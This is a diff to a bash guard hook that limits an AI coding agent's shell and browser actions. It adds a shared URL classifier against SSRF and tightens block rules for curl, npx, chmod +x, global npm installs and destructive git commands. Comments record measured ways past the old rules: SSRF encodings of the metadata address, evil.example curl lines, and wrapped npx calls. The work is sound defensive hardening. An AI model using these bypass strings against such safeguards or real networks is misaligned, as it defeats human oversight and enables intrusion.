@@ -350,6 +350,114 @@ seg_match() {
   printf '%s\n' "$_segments" | grep -qE "$1"
 }
 
+# ── The URL classifier: ONE implementation, two policies ──────────────────────
+#
+# This body used to live inline in the `mcp__playwright__browser_navigate` arm and nowhere else.
+# The curl rule below needed the same question answered — where does this URL actually go? — and
+# writing a second URL parser in this file is the two-implementations defect this repo names in
+# four places: they disagree, and you find out during the incident. So the PARSING moved here and
+# only the POLICY stayed at each call site, because the two policies are genuinely opposite:
+#
+#   browser  the open web is allowed, the LOCAL network is refused   (SSRF)
+#   curl     only loopback is allowed, everything else is refused    (egress)
+#
+# One parser cannot be right for one caller and wrong for the other; two parsers can, silently.
+#
+# Emits exactly one line: SPECIAL| · LOOPBACK| · LOCAL|<detail> · PUBLIC| · BAD|<reason>.
+# Callers map those to a verdict. Anything unrecognised is a refusal at the call site.
+url_class() {
+  _URL="$1" python3 <<'PYEOF'
+import os, ipaddress, unicodedata
+
+url = os.environ.get('_URL', '')
+
+def canon(host):
+    # Return an ip_address for any textual IPv4/IPv6 form a browser accepts, else None.
+    # NFKC first: Chromium applies UTS-46 before parsing the host, so the fullwidth digits in
+    # http://１６９．２５４．１６９．２５４/ become 169.254.169.254 before it ever resolves. Without this the
+    # string splits on no ASCII dot, int() raises, canon returns None, and the guard reads it as
+    # an ordinary hostname. Found by an independent reviewer against the rewritten guard.
+    h = unicodedata.normalize('NFKC', host).strip().rstrip('.').lower()
+    if h.startswith('[') and h.endswith(']'):
+        try: return ipaddress.ip_address(h[1:-1])
+        except ValueError: return None
+    parts = h.split('.')
+    if 1 <= len(parts) <= 4 and all(parts):
+        nums = []
+        for p in parts:
+            try:
+                if p.startswith('0x'): nums.append(int(p, 16))
+                elif p.startswith('0') and len(p) > 1: nums.append(int(p, 8))
+                else: nums.append(int(p, 10))
+            except ValueError:
+                return None
+        try:
+            n = 0
+            for i, v in enumerate(nums[:-1]):
+                if v > 255: return None
+                n |= v << (8 * (3 - i))
+            if nums[-1] >= (1 << (8 * (5 - len(nums)))): return None
+            n |= nums[-1]
+            return ipaddress.ip_address(n)
+        except (ValueError, IndexError):
+            return None
+    try: return ipaddress.ip_address(h)
+    except ValueError: return None
+
+if not url:
+    print('BAD|no url given'); raise SystemExit(0)
+
+low = url.strip().lower()
+if low == 'about:blank':
+    print('SPECIAL|about:blank'); raise SystemExit(0)
+scheme = low.split(':', 1)[0] if ':' in low else ''
+if scheme not in ('http', 'https'):
+    print('BAD|' + url + ' - only http and https reach the network'); raise SystemExit(0)
+
+rest = url.split('://', 1)[1] if '://' in url else url
+# WHATWG treats a backslash as a path delimiter for special schemes (http/https), so the
+# authority ENDS at the first backslash. Without this substitution the guard was wrong in BOTH
+# directions, verified against Node's own URL parser:
+#   169.254.169.254 [backslash] @evil.com   browser -> 169.254.169.254   guard said ALLOW
+#   evil.com [backslash] @169.254.169.254   browser -> evil.com          guard said BLOCK
+# Found by an independent reviewer against the rewritten guard. `chr(92)` is kept although this
+# is now a QUOTED heredoc, where a literal backslash would survive: the original hazard was that
+# the enclosing double-quoted bash string ate it, and writing the character one unambiguous way
+# costs nothing and cannot be re-broken by moving this body again.
+rest = rest.replace(chr(92), '/')   # chr(92) is a backslash
+authority = rest.split('/', 1)[0].split('?', 1)[0].split('#', 1)[0]
+if '@' in authority:
+    authority = authority.rsplit('@', 1)[1]
+if authority.startswith('['):
+    host = authority[:authority.find(']') + 1] if ']' in authority else authority
+else:
+    host = authority.split(':', 1)[0]
+
+if not host:
+    print('BAD|' + url + ' - host could not be parsed'); raise SystemExit(0)
+
+# `localhost` is a NAME, not an address, so canon() returns None for it and it would classify as
+# an ordinary hostname. That was invisible while the browser arm was the only caller — it allows
+# the open web and loopback alike, so the two answers were the same verdict. curl's policy tells
+# them apart, and reading `curl http://localhost:3000/health` as external would refuse the
+# perception loop. RFC 6761 reserves `localhost` and everything under `.localhost` for loopback;
+# `localhost.evil.com` is neither and stays public.
+_h = unicodedata.normalize('NFKC', host).strip().rstrip('.').lower()
+if _h == 'localhost' or _h.endswith('.localhost'):
+    print('LOOPBACK|'); raise SystemExit(0)
+
+ip = canon(host)
+if ip is None:
+    print('PUBLIC|')                       # an ordinary hostname; DNS is not resolved here
+elif ip.is_loopback:
+    print('LOOPBACK|')
+elif ip.is_private or ip.is_link_local or ip.is_reserved or ip.is_unspecified or ip.is_multicast:
+    print('LOCAL|' + url + ' resolves to ' + str(ip) + ', which is the local network, not the web')
+else:
+    print('PUBLIC|')
+PYEOF
+}
+
 # ── Route by tool type ────────────────────────────────────────────────────────
 
 case "$tool_name" in
@@ -558,7 +666,16 @@ for toks in toklists:
                 out('BLOCK|rm -r -f names no target this hook can read (a bare invocation, or one fed by a pipe such as `xargs rm -rf`). Name the exact directory.')
             for t in operands:
                 if unresolved(t):
-                    out('BLOCK|rm -r -f "' + t + '" carries a value this hook cannot resolve (a variable, a command substitution or ~), so it cannot be shown to be inside the project. Write the path literally.')
+                    # THE MESSAGE MUST NAME THE FIX, NOT ONLY THE REFUSAL. The scratchpad is where
+                    # agents are told to work, so `rm -rf "$TMPDIR/x"` will hit this often. A message
+                    # that says only "refused" produces a confused retry loop; one that names the
+                    # literal roots produces a single corrected command.
+                    out('BLOCK|rm -r -f "' + t + '" carries a value this hook cannot resolve ($VAR, $(...), a backtick or ~), so it cannot be shown to be inside the project.\n'
+                        '   WHAT TO DO: write the path literally instead of through a variable. These work:\n'
+                        '     a relative path that stays inside the project   node_modules · ./build · dist/ · build/*\n'
+                        '     the project root, spelled out                   ' + root + '/build\n'
+                        '     the agent scratchpad, spelled out               ' + scratch + '/x\n'
+                        '   If you meant $TMPDIR, that is the scratchpad on the line above.')
                 base = glob_base(t)
                 if any(c in GLOB for c in base):
                     out('BLOCK|rm -r -f "' + t + '" carries a glob outside its final path component, so its expansion is not bounded by any directory this hook can name.')
@@ -634,17 +751,35 @@ PYEOF
     # now narrowed to the verbs actually measured (npm run, bun test, ...) and the fetch-and-run
     # verbs are denied in settings.json. This rule is the second half of that fix: a settings
     # deny can be bypassed by a launch flag, and this hook is the backstop that cannot.
-    if printf '%s' "$command" | grep -qE '(^|[;&|]\s*)(npx|bunx)\b|\bnpm\s+exec\b|\bbun\s+x\b|\bpnpm\s+dlx\b'; then
+    # THE ANCHOR WAS THE HOLE. `(^|[;&|]\s*)` required npx to sit at the start of the string or
+    # directly after a separator, so anything else in front of it walked past. Measured 2026-09-07,
+    # all three exit 0 on the pre-fix hook and none is an evasion — they are how scripts are written:
+    #   FOO=1 npx cowsay hi          an environment prefix
+    #   bash -c 'npx cowsay hi'      wrapped, which the tokenless anchor cannot see
+    #   if true; then npx cowsay hi  after a keyword rather than a separator
+    # `\b` asks the question the rule meant — is the word `npx` here — and does not enumerate the
+    # things that may precede it. It over-blocks a document mentioning npx, which is the cheap
+    # direction and the same trade the heredoc note at the bottom of this file records.
+    if printf '%s' "$command" | grep -qE '\b(npx|bunx)\b|\bnpm\s+exec\b|\bbun\s+x\b|\bpnpm\s+dlx\b'; then
       block "npx / bunx / npm exec / bun x / pnpm dlx download and execute a remote package - the same capability the HTTP-client rules refuse. Add the dependency to package.json and run it from node_modules, or ask the founder."
     fi
 
     # ── BLOCK: chmod +x ──────────────────────────────────────────────────────
-    if printf '%s' "$command" | grep -qE 'chmod\s+\+x'; then
+    # `chmod\s+\+x` matched ONE spelling. `chmod a+x` and `chmod u+x` are the same act and both
+    # exited 0. The mode argument is now read as a mode: optional flags, an optional `[ugoa]`
+    # class, `+`, and an x anywhere in the permission letters. `chmod 755` still has no `+` and is
+    # still allowed, which is what the message tells you to use.
+    if printf '%s' "$command" | grep -qE 'chmod\s+(-[a-zA-Z-]+\s+)*[ugoa]*\+[rwXst]*x'; then
       block "chmod +x is blocked. Use 'chmod 755 <file>' for explicit permissions, or ask the CEO to approve."
     fi
 
     # ── BLOCK: npm install -g ────────────────────────────────────────────────
-    if printf '%s' "$command" | grep -qE 'npm\s+install\s+-g|npm\s+i\s+-g'; then
+    # `--global` is the same flag spelled long, and it exited 0. `--global(\s|$)` rather than
+    # `--global\b`, because `\b` also matches inside `--global-style`, which is an unrelated npm
+    # flag that installs nothing globally and must stay allowed.
+    # Per segment with `.*`, so the flag is caught wherever it sits in the invocation
+    # (`npm install typescript -g`) without reaching across a real command separator.
+    if seg_match 'npm\s+(install|i)\b.*[[:space:]](-g\b|--global(\s|$))'; then
       block "Global npm install (npm install -g) is blocked. Use project-local deps via pnpm add --save-dev."
     fi
 
@@ -658,21 +793,60 @@ PYEOF
       block "wget is blocked. Use 'curl -fsSL <url>' for controlled downloads, or ask the CEO to approve wget usage."
     fi
 
-    # ── BLOCK: curl to external URLs (allow localhost / 127.0.0.1) ───────────
-    # Strategy (no lookaheads — macOS grep doesn't support them):
-    # 1. If curl is present AND the command contains http:// or https://
-    # 2. AND the command does NOT contain localhost or 127.0.0.1
-    # 3. → BLOCK (external curl)
+    # ── BLOCK: curl to external URLs (allow loopback) ────────────────────────
+    #
+    # THE EXCLUSION USED TO BE WHOLE-COMMAND, AND THAT IS A HOLE, NOT A STYLE. The rule read: if
+    # `curl` appears AND `http(s)://` appears AND `localhost|127.0.0.1` does NOT appear anywhere,
+    # block. So the word `localhost` ANYWHERE disarmed it. Measured 2026-09-07:
+    #
+    #   curl https://evil.example/x -o /tmp/localhost.txt              exit 0   ALLOWED
+    #   curl http://localhost:3000/health; curl https://evil.example/x exit 0   ALLOWED
+    #
+    # The first needs someone to choose that filename; the SECOND is reachable by accident, because
+    # a loopback health check beside an external API call in one line is ordinary work.
+    #
+    # It also compared SPELLINGS — `localhost` and `127.0.0.1` literally — which is the same
+    # enumeration failure the browser guard above was rewritten to end: `http://2130706433/` and
+    # `http://[::1]/` are loopback and matched neither string. So this rule now asks `url_class`,
+    # the SAME parser the browser arm uses, one URL at a time. Same question, one implementation,
+    # opposite policy: the browser refuses the local network, curl allows ONLY loopback.
+    #
+    # Per SEGMENT, so a loopback call in one command cannot license an external call in the next.
+    # STATED LIMIT, unchanged and deliberately not widened here: a curl with no scheme
+    # (`curl example.com`) still reaches the network and is still allowed, because this rule only
+    # sees things matching `https?://`. That is a real gap and it is reported, not silently fixed —
+    # closing it belongs with a decision about whether `curl` needs an allowlist of its own.
+    #
+    # BOUNDED ON PURPOSE. One `url_class` runs per URL — measured 82ms for one, 136ms for two,
+    # against this file's stated 200ms budget — so an unbounded loop over URLs in a command an
+    # agent chose is a slow path someone can lengthen at will. Past the cap the call is REFUSED
+    # rather than partly checked, because a guard that gives up quietly is the failure mode this
+    # whole file is written against.
+    _curl_urls_seen=0
     if printf '%s' "$command" | grep -qE '\bcurl\b'; then
-      if printf '%s' "$command" | grep -qE 'https?://'; then
-        if ! printf '%s' "$command" | grep -qE '(localhost|127\.0\.0\.1)'; then
-          block "curl to external URL is blocked. Only curl localhost/127.0.0.1 is allowed. Wrap external HTTP calls in Next.js API routes or use the WebFetch MCP tool."
-        fi
-      fi
+      while IFS= read -r _seg; do
+        printf '%s' "$_seg" | grep -qE '\bcurl\b' || continue
+        for _u in $(printf '%s' "$_seg" | grep -oE 'https?://[^[:space:]"'"'"'`|;>&)]+'); do
+          _curl_urls_seen=$((_curl_urls_seen + 1))
+          [ "$_curl_urls_seen" -le 12 ] || block "this command carries more than 12 URLs, which is past the point where this hook will check each one. Split it into separate commands so every URL is evaluated."
+          _cv=$(url_class "$_u") || block "a curl URL could not be evaluated — refusing. This hook fails closed."
+          case "$_cv" in
+            LOOPBACK*) : ;;
+            PUBLIC*)   block "curl to an external URL is blocked: $_u
+   Only loopback is allowed. Wrap external HTTP calls in an API route, or use WebFetch." ;;
+            LOCAL*)    block "curl into the local network is blocked: ${_cv#LOCAL|}" ;;
+            BAD*)      block "curl URL refused: ${_cv#BAD|}" ;;
+            *)         block "the curl URL guard returned nothing readable — refusing. This hook fails closed." ;;
+          esac
+        done
+      done <<< "$_segments"
     fi
 
     # ── BLOCK: git --no-verify ───────────────────────────────────────────────
-    if printf '%s' "$command" | grep -qE 'git\b.*--no-verify'; then
+    # Per segment. Whole-command, `git\b.*--no-verify` refused `git status; npm run x --no-verify`,
+    # where the flag belongs to a different command entirely and skips no git hook. `git commit
+    # --no-verify` is one segment and still blocks.
+    if seg_match 'git\b.*--no-verify'; then
       block "--no-verify skips pre-commit hooks (lint + typecheck). Remove --no-verify and fix the underlying hook failure instead."
     fi
 
@@ -687,16 +861,30 @@ PYEOF
     fi
 
     # ── BLOCK: git reset --hard (allow git reset HEAD for staging) ────────────
-    if printf '%s' "$command" | grep -qE 'git\b.*reset\b.*--hard'; then
+    # BOTH halves per segment, and that is what fixes it. The carve-out ended at `\s*$` — end of
+    # the whole STRING — so `git reset --hard HEAD && npm test` failed the allow-check and was
+    # refused, though it is the exact no-op the carve-out exists to permit. Per segment the `$` is
+    # end of segment, so the carve-out reaches. `git reset --hard abc123` still blocks.
+    if seg_match 'git\b.*reset\b.*--hard'; then
       # Allow: git reset --hard HEAD (no-op relative to current commit)
       # Block: git reset --hard with anything other than HEAD or HEAD~0
-      if ! printf '%s' "$command" | grep -qE 'git\b.*reset\b.*--hard\s+HEAD\s*$'; then
+      # `HEAD(\s|$)` rather than `HEAD\s*$`: per-segment anchoring fixed the `;` form but NOT the
+      # `&&` form, because `&&` is not a segment boundary here (splitting on it is a wider change
+      # with its own blast radius). What the carve-out actually means is "the revision is exactly
+      # HEAD" — so require HEAD to END there. `HEAD~1` and `HEAD^` are followed by neither
+      # whitespace nor end of segment, so both still block, which is the whole point of the rule.
+      if ! seg_match 'git\b.*reset\b.*--hard\s+HEAD(\s|$)'; then
         block "git reset --hard is blocked (destroys uncommitted work). Use 'git stash' to save work, or 'git reset HEAD <file>' to unstage specific files."
       fi
     fi
 
     # ── BLOCK: git checkout -- (discards uncommitted changes) ────────────────
-    if printf '%s' "$command" | grep -qE 'git\b.*checkout\b.*--\s+'; then
+    # Two defects, opposite directions, one line. `git\b.*checkout\b.*--\s+` required WHITESPACE
+    # after the `--`, so `git checkout --` at end of string exited 0; and being whole-command it
+    # refused `git checkout main; npm test -- --watch`, where the `--` is an argument separator for
+    # a different command. `(\s|$)` closes the first, per-segment closes the second, and the leading
+    # `\s` keeps `--detach`, `--track` and `--orphan` allowed as they already were.
+    if seg_match 'git\b.*checkout\b.*\s--(\s|$)'; then
       block "git checkout -- <file> discards uncommitted changes permanently. Use 'git stash' to temporarily save work instead."
     fi
 
@@ -848,92 +1036,26 @@ except Exception:
     # spellings. `ipaddress` decides private / loopback / link-local / reserved, so IPv4 in any
     # encoding and every IPv6 private range are covered by construction instead of by
     # enumeration — which is what the glob version was attempting, and failing.
-    _verdict=$(printf '%s' "$payload" | python3 -c "
-import sys, json, ipaddress, unicodedata
-
-def canon(host):
-    # Return an ip_address for any textual IPv4/IPv6 form a browser accepts, else None.
-    # NFKC first: Chromium applies UTS-46 before parsing the host, so the fullwidth digits in
-    # http://１６９．２５４．１６９．２５４/ become 169.254.169.254 before it ever resolves. Without this the
-    # string splits on no ASCII dot, int() raises, canon returns None, and the guard reads it as
-    # an ordinary hostname. Found by an independent reviewer against the rewritten guard.
-    h = unicodedata.normalize('NFKC', host).strip().rstrip('.').lower()
-    if h.startswith('[') and h.endswith(']'):
-        try: return ipaddress.ip_address(h[1:-1])
-        except ValueError: return None
-    parts = h.split('.')
-    if 1 <= len(parts) <= 4 and all(parts):
-        nums = []
-        for p in parts:
-            try:
-                if p.startswith('0x'): nums.append(int(p, 16))
-                elif p.startswith('0') and len(p) > 1: nums.append(int(p, 8))
-                else: nums.append(int(p, 10))
-            except ValueError:
-                return None
-        try:
-            n = 0
-            for i, v in enumerate(nums[:-1]):
-                if v > 255: return None
-                n |= v << (8 * (3 - i))
-            if nums[-1] >= (1 << (8 * (5 - len(nums)))): return None
-            n |= nums[-1]
-            return ipaddress.ip_address(n)
-        except (ValueError, IndexError):
-            return None
-    try: return ipaddress.ip_address(h)
-    except ValueError: return None
-
+    # THE PARSER MOVED, THE POLICY DID NOT. Everything above still describes what this arm
+    # refuses; the canonicalisation that decides it now lives in `url_class` at the top of this
+    # file, because the curl rule needs the same answer and a second URL parser here would be two
+    # implementations of one check. The mapping below is this arm's whole policy, and it is the
+    # OPPOSITE of curl's: the open web is allowed and the local network is refused.
+    _url=$(printf '%s' "$payload" | python3 -c "
+import sys, json
 try:
     d = json.load(sys.stdin)
-    url = (d.get('tool_input') or {}).get('url') or ''
+    print((d.get('tool_input') or {}).get('url') or '')
 except Exception:
-    print('BLOCK|payload unreadable'); raise SystemExit(0)
+    sys.exit(1)
+" 2>/dev/null) || block "browser navigation payload could not be read — refusing. This hook fails closed."
 
-if not url:
-    print('BLOCK|no url given'); raise SystemExit(0)
-
-low = url.strip().lower()
-if low == 'about:blank':
-    print('ALLOW|'); raise SystemExit(0)
-scheme = low.split(':', 1)[0] if ':' in low else ''
-if scheme not in ('http', 'https'):
-    print('BLOCK|' + url + ' - only http and https reach the network'); raise SystemExit(0)
-
-rest = url.split('://', 1)[1] if '://' in url else url
-# WHATWG treats a backslash as a path delimiter for special schemes (http/https), so the
-# authority ENDS at the first backslash. Without this substitution the guard was wrong in BOTH
-# directions, verified against Node's own URL parser:
-#   169.254.169.254 [backslash] @evil.com   browser -> 169.254.169.254   guard said ALLOW
-#   evil.com [backslash] @169.254.169.254   browser -> evil.com          guard said BLOCK
-# Found by an independent reviewer against the rewritten guard. The literal is written as
-# chr(92) below because this python is embedded in a double-quoted bash string, where a
-# backslash literal is consumed by the shell before python ever sees it -- which is exactly
-# how the first attempt at this fix broke the guard into failing closed on everything.
-rest = rest.replace(chr(92), '/')   # chr(92) is a backslash; a literal here is eaten by bash
-authority = rest.split('/', 1)[0].split('?', 1)[0].split('#', 1)[0]
-if '@' in authority:
-    authority = authority.rsplit('@', 1)[1]
-if authority.startswith('['):
-    host = authority[:authority.find(']') + 1] if ']' in authority else authority
-else:
-    host = authority.split(':', 1)[0]
-
-if not host:
-    print('BLOCK|' + url + ' - host could not be parsed'); raise SystemExit(0)
-
-ip = canon(host)
-if ip is None or ip.is_loopback:
-    print('ALLOW|')
-elif ip.is_private or ip.is_link_local or ip.is_reserved or ip.is_unspecified or ip.is_multicast:
-    print('BLOCK|' + url + ' resolves to ' + str(ip) + ', which is the local network, not the web')
-else:
-    print('ALLOW|')
-" 2>/dev/null) || block "browser navigation could not be evaluated — refusing. This hook fails closed."
+    _verdict=$(url_class "$_url") || block "browser navigation could not be evaluated — refusing. This hook fails closed."
 
     case "$_verdict" in
-      ALLOW*) : ;;
-      BLOCK*) block "browser navigation refused: ${_verdict#BLOCK|}" ;;
+      SPECIAL*|LOOPBACK*|PUBLIC*) : ;;
+      LOCAL*) block "browser navigation refused: ${_verdict#LOCAL|}" ;;
+      BAD*)   block "browser navigation refused: ${_verdict#BAD|}" ;;
       *)      block "browser navigation guard returned nothing readable — refusing. This hook fails closed." ;;
     esac
 
